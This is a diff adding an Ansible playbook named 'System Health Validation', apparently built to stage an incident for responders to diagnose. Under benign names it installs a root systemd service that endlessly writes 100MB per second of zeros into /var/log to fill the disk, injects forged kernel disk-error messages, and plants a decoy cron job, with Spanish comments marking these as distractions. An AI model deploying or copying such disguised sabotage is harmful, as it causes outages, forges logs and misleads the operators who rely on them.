@@ -1,0 +1,97 @@
+---
+- name: "System Health Validation"
+  hosts: localhost
+  connection: local
+  gather_facts: false
+  tasks:
+    - name: "10"
+      ansible.builtin.set_fact:
+        target_node: "{{ groups['app_nodes'] | random }}"
+
+    - name: "20"
+      ansible.builtin.add_host:
+        name: "{{ target_node }}"
+        groups: incident_002_target
+
+    - name: "30"
+      ansible.builtin.debug:
+        msg: "Target selected."
+
+- name: "System Health Validation - Execution"
+  hosts: incident_002_target
+  become: true
+  gather_facts: true
+  tasks:
+    - name: "40"
+      ansible.builtin.stat:
+        path: /var/log/.audit_sync_marker
+      register: check_inject
+
+    - name: "50"
+      ansible.builtin.copy:
+        dest: /usr/local/bin/sys-audit-sync.sh
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          while true; do
+            echo "$(date) [INFO] Syncing audit logs to remote..." >> /var/log/sys-audit.log
+            # Genera 100MB de datos por segundo para llenar la partición rápidamente
+            dd if=/dev/zero bs=1M count=100 >> /var/log/sys-audit.log 2>/dev/null
+            
+            # --- FALSO POSITIVO: Errores falsos de disco en logs del kernel ---
+            logger -p kern.err "EXT4-fs error (device sda3): ext4_find_entry:1455: inode #2: comm sync-daemon: reading directory lblock 0"
+            logger -p kern.err "Buffer I/O error on dev sda3, logical block 0, lost async page write"
+            # ------------------------------------------------------------------
+            
+            sleep 1
+          done
+      when: not check_inject.stat.exists
+
+    - name: "60"
+      ansible.builtin.copy:
+        dest: /etc/systemd/system/sys-audit-sync.service
+        mode: '0644'
+        content: |
+          [Unit]
+          Description=System Audit Log Synchronization Daemon
+          After=network.target
+
+          [Service]
+          Type=simple
+          ExecStart=/usr/local/bin/sys-audit-sync.sh
+          Restart=always
+          RestartSec=3
+
+          [Install]
+          WantedBy=multi-user.target
+      when: not check_inject.stat.exists
+
+    - name: "70"
+      ansible.builtin.systemd:
+        name: sys-audit-sync
+        state: started
+        enabled: true
+        daemon_reload: true
+      when: not check_inject.stat.exists
+
+    # --- FALSO POSITIVO: Cron job sospechoso para distraer ---
+    - name: "80"
+      ansible.builtin.copy:
+        dest: /etc/cron.d/legacy-cleanup
+        mode: '0644'
+        content: |
+          # Legacy system cleanup job
+          * * * * * root /usr/local/bin/legacy-cleanup.sh > /dev/null 2>&1
+      when: not check_inject.stat.exists
+    # ---------------------------------------------------------
+
+    - name: "90"
+      ansible.builtin.file:
+        path: /var/log/.audit_sync_marker
+        state: touch
+        mode: '0600'
+      when: not check_inject.stat.exists
+
+    - name: "100"
+      ansible.builtin.debug:
+        msg: "Validation completed."
